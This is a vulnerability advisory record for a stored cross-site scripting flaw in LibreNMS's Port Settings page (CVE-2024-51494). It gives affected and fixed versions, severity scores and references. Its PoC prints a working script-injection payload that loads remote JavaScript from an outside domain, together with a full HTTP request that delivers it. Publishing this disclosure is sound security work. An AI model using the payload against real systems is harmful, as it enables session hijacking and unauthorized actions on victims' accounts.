advisory_id: GHSA-7663-37rg-c377
datasource_id: github_osv_importer_v2/GHSA-7663-37rg-c377
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-7663-37rg-c377/GHSA-7663-37rg-c377.json
aliases:
  - CVE-2024-51494
summary: |
  LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/app/Http/Controllers/Table/EditPortsController.php
  ### Summary
  A Stored Cross-Site Scripting (XSS) vulnerability in the "Port Settings" page allows authenticated users to inject arbitrary JavaScript through the "descr" parameter when editing a device's port settings. This vulnerability can lead to the execution of malicious code when the "Port Settings" page is visited, potentially compromising the user's session and allowing unauthorized actions.

  ### Details
  When editing a device's port settings, an attacker can inject the following XSS payload into the "descr" parameter:
  ```lo'"><script/src=//15.rs>```

  Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.

  The payload triggers when the "Port Settings" page is visited, exploiting the `$port->ifAlias` variable in the application. The sink is located here:
  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/app/Http/Controllers/Table/EditPortsController.php#L82

  ### PoC
  1. Edit a device's port settings using the following payload in the "descr" parameter:
  ```lo'"><script/src=//15.rs>```
  2. Save the changes.
  3. Navigate to the "Port Settings" page of the device.
  4. Observe that the injected script executes.

  Example Request:
  ```http
  POST /ajax_form.php HTTP/1.1
  Host: <your_host>
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  X-CSRF-TOKEN: <your_token>
  X-Requested-With: XMLHttpRequest
  Cookie: <your_cookie>

  type=update-ifalias&descr=lo'%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&ifName=lo&port_id=1&device_id=1
  ```

  ### Impact

  This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the "Port Settings" page of the device. This could lead to the compromise of user accounts and unauthorized actions performed on their behalf.
impacted_packages:
  - purl: pkg:composer/librenms/librenms
    affected_versions: vers:composer/<=24.9.1
    fixed_versions: vers:composer/24.10.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-7663-37rg-c377/GHSA-7663-37rg-c377.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-79
references:
  - url: https://github.com/librenms/librenms
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/commit/82a744bfe29017b8b58b5752ab9e1b335bedf0a0
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/security/advisories/GHSA-7663-37rg-c377
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-51494
    reference_type:
    reference_id: CVE-2024-51494
